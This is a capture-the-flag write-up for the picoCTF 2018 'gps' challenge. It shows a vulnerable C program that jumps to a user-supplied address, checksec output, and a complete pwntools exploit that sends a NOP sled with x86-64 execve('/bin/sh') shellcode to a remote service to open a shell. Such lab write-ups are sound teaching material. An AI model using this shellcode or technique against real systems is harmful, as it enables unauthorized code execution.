gps - Points: 550
===========

## Description

>You got really lost in the wilderness, with nothing but your trusty gps. Can you find your way back to a shell and get the flag? Connect with nc 2018shell1.picoctf.com 29035

## Hint:

> * Can you make your shellcode randomization-resistant?

## Vulnerable Code:

```c
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define GPS_ACCURACY 1337

typedef void (fn_t)(void);

void initialize() {
    printf("GPS Initializing");
    for (int i = 0; i < 10; ++i) {
        usleep(300000);
        printf(".");
    }
    printf("Done\n");
}

void acquire_satellites() {
    printf("Acquiring satellites.");
    for (int i = 0; i < 3; ++i) {
        printf("Satellite %d", i);
        for (int j = 0; j < rand() % 10; ++j) {
            usleep(133700);
            printf(".");
        }
        if (i != 3) {
            printf("Done\n");
        } else {
            printf("Weak signal.\n");
        }
    }

    printf("\nGPS Initialized.\n");
    printf("Warning: Weak signal causing low measurement accuracy\n\n");
}

void *query_position() {
  char stk;
  int offset = rand() % GPS_ACCURACY - (GPS_ACCURACY / 2);
  void *ret = &stk + offset;
  return ret;
}


int main() {
    setbuf(stdout, NULL);

    char buffer[0x1000];
    srand((unsigned) (uintptr_t) buffer);

    initialize();
    acquire_satellites();

    printf("We need to access flag.txt.\nCurrent position: %p\n", query_position());

    printf("What's your plan?\n> ");
    fgets(buffer, sizeof(buffer), stdin);

    fn_t *location;

    printf("Where do we start?\n> ");
    scanf("%p", (void**) &location);

    location();
    return 0;
}

```

## Useful Information

> location = address string

```
checksec gps
   
   Arch:     amd64-64-little
   
   RELRO:    Partial RELRO
   
   Stack:    Canary found
   
   NX:       NX disabled
   
   PIE:      No PIE (0x400000)
   
   RWX:      Has RWX segments
```

## Exploit


**Send a X64 Shellcode with a big Nopsled and give the location adress as second user input:**

```python
#!/usr/bin/python2.7
from pwn import *
import time,sys

rem = remote("2018shell1.picoctf.com",29035)
adr_shellcode=rem.recvuntil("What's your plan?").split("Current position: ")[1][2:14]
print("adr_shellcode='"+adr_shellcode+"'")

payload="\x90"*0x800+"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
rem.sendline(payload)
print(rem.recv())
rem.sendline(adr_shellcode)
rem.interactive()
rem.close()

```
